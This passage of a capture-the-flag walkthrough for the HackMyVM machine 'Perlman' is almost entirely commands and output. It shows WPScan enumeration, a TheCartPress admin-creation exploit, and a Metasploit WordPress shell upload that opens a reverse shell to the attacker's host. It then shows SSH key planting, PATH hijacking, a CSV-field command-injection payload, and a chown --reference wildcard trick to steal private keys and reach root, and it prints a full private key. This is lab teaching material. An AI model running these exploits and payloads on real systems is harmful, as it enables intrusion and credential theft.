 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 6.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/

[+] WordPress theme in use: twentytwentyone
 | Location: http://itzhak.perlman.hmv/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://itzhak.perlman.hmv/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://itzhak.perlman.hmv/wp-content/themes/twentytwentyone/style.css?ver=1.6
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://itzhak.perlman.hmv/wp-content/themes/twentytwentyone/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] thecartpress
 | Location: http://itzhak.perlman.hmv/wp-content/plugins/thecartpress/
 | Latest Version: 1.5.3.6 (up to date)
 | Last Updated: 2017-01-12T19:25:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: TheCartPress eCommerce Shopping Cart <= 1.5.3.6 - Unauthenticated Arbitrary Admin Account Creation
 |     References:
 |      - https://wpscan.com/vulnerability/9b403259-0c84-4566-becd-eb531c486c21
 |      - https://www.exploit-db.com/exploits/50378/
 |
 | Version: 1.5.3.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://itzhak.perlman.hmv/wp-content/plugins/thecartpress/readme.txt

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <=======================================================================================> (494 / 494) 100.00% Time: 00:00:00
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 72

[+] Finished: Thu Sep 23 08:49:55 2022
[+] Requests Done: 543
[+] Cached Requests: 8
[+] Data Sent: 167.251 KB
[+] Data Received: 19.91 MB
[+] Memory used: 267.684 MB
[+] Elapsed time: 00:00:08
```

```bash
$ searchsploit TheCartPress
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin TheCartPress 1.1.1 - Remote File Inclusion                                                                          | php/webapps/17860.txt
WordPress Plugin TheCartPress 1.3.9 - Multiple Vulnerabilities                                                                       | php/webapps/36860.txt
WordPress Plugin TheCartPress 1.4.7 - Multiple Vulnerabilities                                                                       | php/webapps/38869.txt
Wordpress Plugin TheCartPress 1.5.3.6 - Privilege Escalation (Unauthenticated)                                                       | php/webapps/50378.py
WordPress Plugin TheCartPress 1.6 - 'OptionsPostsList.php' Cross-Site Scripting                                                      | php/webapps/36481.txt
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
$ searchsploit -m php/webapps/50378.py
  Exploit: Wordpress Plugin TheCartPress 1.5.3.6 - Privilege Escalation (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50378
     Path: /usr/share/exploitdb/exploits/php/webapps/50378.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/adok/Documents/CTF/HackMyVM/Perlman/50378.py

$ python3 50378.py http://itzhak.perlman.hmv/
TheCartPress <= 1.5.3.6 - Unauthenticated Privilege Escalation
Author -> space_hen (www.github.com/spacehen)
Inserting admin...
Success!
Now login at /wp-admin/
```

### [Wordpress Plugin TheCartPress 1.5.3.6 - Privilege Escalation (Unauthenticated)](https://www.exploit-db.com/exploits/50378)

```bash
$ msfconsole -q    
msf6 > search wordpress admin upload shell

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_admin_shell_upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.6      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD admin1234
PASSWORD => admin1234
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin_02
USERNAME => admin_02
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 192.168.1.6
LHOST => 192.168.1.6
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS itzhak.perlman.hmv
RHOSTS => itzhak.perlman.hmv
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 192.168.1.6:4444 
[*] Authenticating with WordPress using admin_02:admin1234...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/AkYJigSCfm/mUCyJKHmLs.php...
[*] Sending stage (39927 bytes) to 192.168.1.11
[+] Deleted mUCyJKHmLs.php
[+] Deleted AkYJigSCfm.php
[+] Deleted ../AkYJigSCfm
[*] Meterpreter session 1 opened (192.168.1.6:4444 -> 192.168.1.11:46660) at 2022-09-23 09:16:19 +0000

meterpreter > 
```

### ADD Private Key to RITA

```bash
meterpreter > cd /tmp
meterpreter > shell
Process 9033 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@perlman:/tmp$ su rita
su rita
Password: cookie

rita@perlman:/tmp$ cd
cd
rita@perlman:~$ ls -la
ls -la
total 28
drwxr-xr-x 5 rita rita 4096 Sep 23 08:57 .
drwxr-xr-x 5 root root 4096 Jul 23  2022 ..
lrwxrwxrwx 1 rita rita    9 Jul 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 rita rita 3526 Jul 26  2022 .bashrc
drwxr-xr-x 3 rita rita 4096 Jul 26  2022 .local
drwx------ 3 rita rita 4096 Sep 23 08:57 mail
-rw-r--r-- 1 rita rita  808 Sep 11 12:14 .profile
drwx------ 2 rita rita 4096 Sep 11 12:11 .ssh
rita@perlman:~$ cd .ssh
cd .ssh
rita@perlman:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCaEi.....bpvs0AlaO+X5qHp9v4w== adok@valakas" >> authorized_keys
<s0AlaO+X5qHp9v4w== adok@valakas" >> authorized_keys
rita@perlman:~/.ssh$ 
```

## Priviledge Escalation

### pspy32

```bash
rita@perlman:/tmp$ wget http://192.168.1.6:9000/pspy32
--2022-09-23 10:28:45--  http://192.168.1.6:9000/pspy32
Connecting to 192.168.1.6:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2656352 (2.5M) [application/octet-stream]
Saving to: ‘pspy32’

pspy32                                    100%[====================================================================================>]   2.53M  --.-KB/s    in 0.03s   

2023-03-09 10:28:45 (78.4 MB/s) - ‘pspy32’ saved [2656352/2656352]

rita@perlman:/tmp$ chmod +x pspy32 
rita@perlman:/tmp$ ./pspy32 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022-09-23 10:28:57 CMD: UID=1000 PID=9543   | ./pspy32 
....
2022-09-23 10:29:01 CMD: UID=1001 PID=9574   | /bin/bash /home/milou/clean.sh 
....
rita@perlman:/tmp$ 
```

```bash 
rita@perlman:/home/milou$ cat clean.sh 
#! /bin/bash


ext=(save bak bif old bck bkz sqb bak2)

for x in ${ext[@]}
do
cd /tmp && find . -type f -user $(whoami) -name "*.$x" -exec rm {} +
done
```

### User pivoting (RITA > MILOU)

```bash
rita@perlman:/tmp$ echo "cp /home/milou/.ssh/id_rsa /tmp/milou && chmod 777 /tmp/milou" > find
rita@perlman:/tmp$ chmod +x find
rita@perlman:/tmp$ watch ls -al milou

rita@perlman:/tmp$ cat milou
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqbS3htQvnVwWEyQl8L1mDdnZzxHiTrP+iqmx/LUR/SZ+/8bMk7c2
KGTBZZFt3fZnF6VejwhIdm06mWtFWAIuUrr2MyUNl+QbWhG3kL/NGPQcKoqyEgOIOkKb1V
Mr4m5k5C5Cprh3c96YVWZTVqs/tqDBVFJ+nMlV+zJ7vbSmfJ84a2h/h9/ZQ+EeP97jjXhN
GZa5Q14wons2oEsHrepmyDYlRs3a9nZe0NNq5/FPehvNYGRvAxUwDMRTDcAATqDVL3TPln
aD02kAoJ9VQ34elDOu9X777h/o26VudlpfHd+dYqIhfwPv5WB5bt0PXCIoYiCiA4pTWGb1
6EOq4qR9SUJsWfmDEEG+nVjUn+ZtfHxduUG4bj2b6+ucfr/plCvIUpnosc7x97UGh5vXxF
RfJeBjcqEZENjSKtpuQn6OTCJ1qRcFW0bCKiUr1rUq0WFNPke9X0qXBIkfiyU2mhtIGpty
BQHLBoSSMXEfHogB+UV9BJ4gm58ohejY3r2kB3MJAAAFiOkpltbpKZbWAAAAB3NzaC1yc2
EAAAGBAKm0t4bUL51cFhMkJfC9Zg3Z2c8R4k6z/oqpsfy1Ef0mfv/GzJO3NihkwWWRbd32
ZxelXo8ISHZtOplrRVgCLlK69jMlDZfkG1oRt5C/zRj0HCqKshIDiDpCm9VTK+JuZOQuQq
a4d3PemFVmU1arP7agwVRSfpzJVfsye720pnyfOGtof4ff2UPhHj/e4414TRmWuUNeMKJ7
NqBLB63qZsg2JUbN2vZ2XtDTaufxT3obzWBkbwMVMAzEUw3AAE6g1S90z5Z2g9NpAKCfVU
N+HpQzrvV+++4f6NulbnZaXx3fnWKiIX8D7+VgeW7dD1wiKGIgogOKU1hm9ehDquKkfUlC
bFn5gxBBvp1Y1J/mbXx8XblBuG49m+vrnH6/6ZQryFKZ6LHO8fe1Boeb18RUXyXgY3KhGR
DY0irabkJ+jkwidakXBVtGwiolK9a1KtFhTT5HvV9KlwSJH4slNpobSBqbcgUBywaEkjFx
Hx6IAflFfQSeIJufKIXo2N69pAdzCQAAAAMBAAEAAAGAFg/wbA7ZwdNe604fwJRe2B4iOt
FQYnrz9ILrKLdBh2+hww7NOcbvu4Cdw96MMfb+oAxXprCk+wBoRdm0QiTGcOrtZujCQ6Tc
CXGUM7U7rKrPnpg5Xi4nX6uZJrqRUfaYFzIMaDBDF0Uw+Kk83F+XAN8VQykWXLuv+eAuRh
NeMYVhiFUlfzySukhh7lvDqXiiTVlS7HcqS3VJPL2EWg/HHPAtGG9ar//jg7J4i37LnkxO
/uEPrY7rmD1NrtPvNkmiNzN5cq9w30Ve9wt4nQMHpNZ+KZYojJcEVxI9qWF8wB3Rxx4pGJ
QmvhBcZLNa+vwmhqweJ7MO2cMwdJI5BWf21TAGf/8NQ0hoGDE0Yy2lwCVTh5Ow2xBIyV4x
OBVl3IR0/HSeP8p48Mh1BjhxTfpGl58C1DaH0lgk8AzmhY5Vt2WZXzd+XXm5za1KWHJcWL
soBlKTWPmHvaFyhnyJulrh53//R/bdgAGHjhHm63+QMlDbr7rELSmUxfyuuzx5QjqBAAAA
wDZTWnAXApcfOvHYZ8hP6zGQybXKbVRW7SgSPjI0rJSvVsoIm/L0NNnicDZEg5EOfuGDTk
v1Pu8iNYF8uyXhU1ZMn81oAfK/qWWY/AMEmUJQt3Dp0jLQf/n3rypRTPOotzhCQMV0ipxX
3a/BwR9QeNf1181S/klWroa96epRtALzzKs0NTAg0cbmAHBDAkef4tbNBM2PRlYN+32Iyt
VDppjsH9dX1+cWVxwenjtwQXkr4Vzo1sHADVB1rn9khroe6wAAAMEA2Th9DGLdXIUUx+J6
w6yR6OxMgxUF4HJdP0GogQYqx93VqsXQY9GC0vMIrQNxQF+00uHyMztyOAaT9r3BoQgMq7
vqM6W2kS5NSq1O7MbBV7ZBMA8ngWWOVvur0MaCv8vJmGA14RpD8Wo8NZuE6KAaP8d03ct+
6EFv7Lk7shaa0QfsC2RF1h4bp/gLG1aqhUEsepIiQH7D1WKeXmuF0Usd8wohYFKlTTrFm+
pjXbBXj25mX1hBJ1F1y6kfx+8JFN9VAAAAwQDIALCU3fCJ7sqKyGbdNxamC+vwezQ6ZptK
8e70JxHqAEfuL/YKsZrqyt9rFP/9vR4kMsNo6QDzmve0YyEI2lRWKw4MMzCpsUSYVwNI0Q
qtdIOCfYzgT2duv4wDlujQsx6rg6clDlFh1VACRc51b9169j6HkqgS9WRmdSGp+vZu/Dol
uY0h4YVayCtgXaLRjIPBOj46iH+PBkohdLJCi4eWze0hA5hqtvFfo221lyJN7MhD96IpIi
HLRZcy1a50/OUAAAARbWlsb3VAcGVybG1hbi5obXYBAg==
-----END OPENSSH PRIVATE KEY-----
rita@perlman:/tmp$ 
```

```bash
rita@perlman:/tmp$ ssh -i milou milou@localhost
Linux perlman.hmv 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
Last login: Sun Sep 23 11:05:39 2022 from ::1
milou@perlman:~$ ls -la
total 32
drwxr-xr-x 4 milou milou 4096 Sep 11 12:14 .
drwxr-xr-x 5 root  root  4096 Jul 23  2022 ..
lrwxrwxrwx 1 root  root     9 Jul 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 milou milou  220 Jul 26  2022 .bash_logout
-rw-r--r-- 1 milou milou 3528 Jul 26  2022 .bashrc
-rwxr-xr-x 1 milou milou  152 Sep 11 12:14 clean.sh
drwxr-xr-x 3 milou milou 4096 Jul 26  2022 .local
-rw-r--r-- 1 milou milou  883 Jul 27  2022 .profile
drwx------ 2 milou milou 4096 Sep 11 12:11 .ssh
milou@perlman:~$ sudo -l
Matching Defaults entries for milou on perlman:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User milou may run the following commands on perlman:
    (ze_perlman) NOPASSWD: /bin/bash /home/ze_perlman/inventory
milou@perlman:~$ 
```

```bash
#! /bin/bash

echo -e "\n+IT Inventory+\n"
green=$(tput setaf 2)
bold=$(tput bold)
normal=$(tput sgr0)

while IFS=, read item brand price numb
do
  subtotal=$((numb*price))
  echo -e "Item:\t\t ${bold}$item${normal}" 
  echo -e "Brand:\t\t $brand"
  echo -e "Price/Unit:\t $price$" 
  echo -e "Quantity:\t $numb pcs"
  echo -e "Subtotal:\t $subtotal$"
  echo ""

for x in ${subtotal[@]}
do
((  total+=x ))
done

sum=0
for i in "${total[@]}"
do
  (( sum+=i ))
done

done < <(cat perl_store.csv |sed -n '1!p')

echo -e "\nTotal cost: \t ${bold}${green}$sum$"

milou@perlman:~$ cat /home/ze_perlman/perl_store.csv 
item,brand,price,numb
CPU,AMD,3,550
GPU,Nvidia,4,1150
SCREEN,Samsung,4,400
MOUSE,Razer,6,20
KEYBOARD,Logitech,95,7
milou@perlman:~$ 
```

### LFI "perl_store.csv"

```bash
item,brand,price,numb
CPU,AMD,3,550,x[$(id>&2)]
GPU,Nvidia,4,1150
SCREEN,Samsung,4,400
MOUSE,Razer,6,20
KEYBOARD,Logitech,95,7
```

```bash
milou@perlman:~$ cd /home/ze_perlman/
milou@perlman:/home/ze_perlman$ sudo -u ze_perlman /bin/bash /home/ze_perlman/inventory

+IT Inventory+

uid=1002(ze_perlman) gid=1002(ze_perlman) groups=1002(ze_perlman)
Item:            CPU
Brand:           AMD
Price/Unit:      3$
Quantity:        550,x[$(id>&2)] pcs
Subtotal:        0$

Item:            GPU
Brand:           Nvidia
Price/Unit:      4$
Quantity:        1150 pcs
Subtotal:        4600$

Item:            SCREEN
Brand:           Samsung
Price/Unit:      4$
Quantity:        400 pcs
Subtotal:        1600$

Item:            MOUSE
Brand:           Razer
Price/Unit:      6$
Quantity:        20 pcs
Subtotal:        120$

Item:            KEYBOARD
Brand:           Logitech
Price/Unit:      95$
Quantity:        7 pcs
Subtotal:        665$


Total cost:      6985$
milou@perlman:/home/ze_perlman$
```

* Change LFI perl_store.csv (ID > SSH Private Key)

```bash
milou@perlman:/home/ze_perlman$ cat perl_store.csv 
item,brand,price,numb
CPU,AMD,3,550,x[$(cp /home/ze_perlman/.ssh/id_rsa /dev/shm>&2 ; chmod 777 /dev/shm/id_rsa>&2)]
GPU,Nvidia,4,1150
SCREEN,Samsung,4,400
MOUSE,Razer,6,20
KEYBOARD,Logitech,95,7
```

```bash
milou@perlman:/home/ze_perlman$ sudo -u ze_perlman /bin/bash /home/ze_perlman/inventory

+IT Inventory+

Item:            CPU
Brand:           AMD
Price/Unit:      3$
Quantity:        550,x[$(cp /home/ze_perlman/.ssh/id_rsa /dev/shm>&2 ; chmod 777 /dev/shm/id_rsa>&2)] pcs
Subtotal:        0$

Item:            GPU
Brand:           Nvidia
Price/Unit:      4$
Quantity:        1150 pcs
Subtotal:        4600$

Item:            SCREEN
Brand:           Samsung
Price/Unit:      4$
Quantity:        400 pcs
Subtotal:        1600$

Item:            MOUSE
Brand:           Razer
Price/Unit:      6$
Quantity:        20 pcs
Subtotal:        120$

Item:            KEYBOARD
Brand:           Logitech
Price/Unit:      95$
Quantity:        7 pcs
Subtotal:        665$


Total cost:      6985$
milou@perlman:/home/ze_perlman$ ls /dev/shm/                                                                                                                           
id_rsa
milou@perlman:/home/ze_perlman$ cd /dev/shm/

milou@perlman:/dev/shm$ ssh -i id_rsa ze_perlman@localhost
Linux perlman.hmv 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
Last login: Sun Sep 11 11:31:27 2022 from ::1

ze_perlman@perlman:~$ cd /dev/shm/
ze_perlman@perlman:/dev/shm$ mv id_rsa ze_perlman
```

## ROOT

```bash
ze_perlman@perlman:~$ sudo -l
Matching Defaults entries for ze_perlman on perlman:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ze_perlman may run the following commands on perlman:
    (root) NOPASSWD: /bin/bash /opt/backup/bk *
ze_perlman@perlman:~$ 
```

```bash
ze_perlman@perlman:/opt/backup$ cat bk
#! /bin/bash

vfy=$(</opt/vfy.txt)

backup(){

cp /etc/{passwd,shadow,sudoers} /opt/backup
cp ~/.ssh/id_rsa /opt/backup
chmod 700 /opt/backup/*
chmod 700 /root
chown root:root /usr/lib/news/*
chown root:root *
chown -R news:news /var/lib/news
chown -R www-data:www-data /var/www
}


[[ $1 == "${vfy/un/}" ]] && backup
ze_perlman@perlman:/opt/backup$
```

```bash
ze_perlman@perlman:/opt/backup$ touch ref
ze_perlman@perlman:/opt/backup$ touch "./--reference=ref"
ze_perlman@perlman:/opt/backup$ cat ../vfy.txt
undesired-root-2022
ze_perlman@perlman:/opt/backup$ 
```

```bash
ze_perlman@perlman:/opt/backup$ sudo /bin/bash /opt/backup/bk desired-root-2022
chmod: changing permissions of '/opt/backup/bk': Operation not permitted
chown: cannot access 'root:root': No such file or directory
chown: changing ownership of 'bk': Operation not permitted
ze_perlman@perlman:/opt/backup$ ls -la
total 28
drwxrwx--- 2 root       ze_perlman 4096 Sep 23 11:13  .
d-wxr-x--- 3 root       ze_perlman 4096 Sep 11 12:15  ..
-rwxr-xr-x 1 root       root        318 Jul 23  2022  bk
-rwx------ 1 ze_perlman ze_perlman 2602 Sep 23 11:13  id_rsa
-rwx------ 1 ze_perlman ze_perlman 1800 Sep 23 11:13  passwd
-rwx------ 1 ze_perlman ze_perlman    0 Sep 23 11:12  ref
-rwx------ 1 ze_perlman ze_perlman    0 Sep 23 11:12 '--reference=ref'
-rwx------ 1 ze_perlman ze_perlman 1224 Sep 23 11:13  shadow
-rwx------ 1 ze_perlman ze_perlman  799 Sep 23 11:13  sudoers

ze_perlman@perlman:/opt/backup$ cp id_rsa /dev/shm/
ze_perlman@perlman:/opt/backup$ mv id_rsa root && chmod 600 root

ze_perlman@perlman:/opt/backup$ ls -l
total 20
-rwxr-xr-x 1 root       root        318 Jul 23  2022  bk
-rwx------ 1 ze_perlman ze_perlman 1800 Sep 23 11:13  passwd
-rwx------ 1 ze_perlman ze_perlman    0 Sep 23 11:12  ref
-rwx------ 1 ze_perlman ze_perlman    0 Sep 23 11:12 '--reference=ref'
-rw------- 1 ze_perlman ze_perlman 2602 Sep 23 11:13  root
-rwx------ 1 ze_perlman ze_perlman 1224 Sep 23 11:13  shadow
-rwx------ 1 ze_perlman ze_perlman  799 Sep 23 11:13  sudoers

ze_perlman@perlman:/opt/backup$ ssh -i root root@localhost
Linux perlman.hmv 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
Last login: Sun Sep 11 12:59:15 2022 from 192.168.0.29
root@perlman:~# 
```

